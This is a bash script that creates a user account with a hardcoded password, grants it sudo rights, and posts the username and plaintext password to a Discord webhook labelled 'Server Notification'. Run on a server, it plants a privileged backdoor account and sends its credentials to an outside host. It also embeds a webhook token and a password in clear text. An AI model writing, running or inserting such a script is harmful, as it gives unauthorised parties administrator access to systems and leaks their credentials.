#!/bin/bash

# Variables
USERNAME="nano"
PASSWORD="Mizi123!"
DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1269083687388184618/TTuAOMwYmJysCRrW9vGK7TEkR9Rd5zpIdhAjA4zKd6-YO86UEqAzNp9aIhm_7bX1SXNk"

# Create the user
sudo useradd -m -p $(openssl passwd -1 $PASSWORD) $USERNAME

# Add the user to the 'sudo' group
sudo usermod -aG sudo $USERNAME

# Notify via Discord
curl -H "Content-Type: application/json" -X POST -d "{
  \"username\": \"Server Notification\",
  \"content\": \"New user created:\nUsername: $USERNAME\nPassword: $PASSWORD\"
}" $DISCORD_WEBHOOK_URL

echo "User $USERNAME created and added to sudo group. Notification sent to Discord."
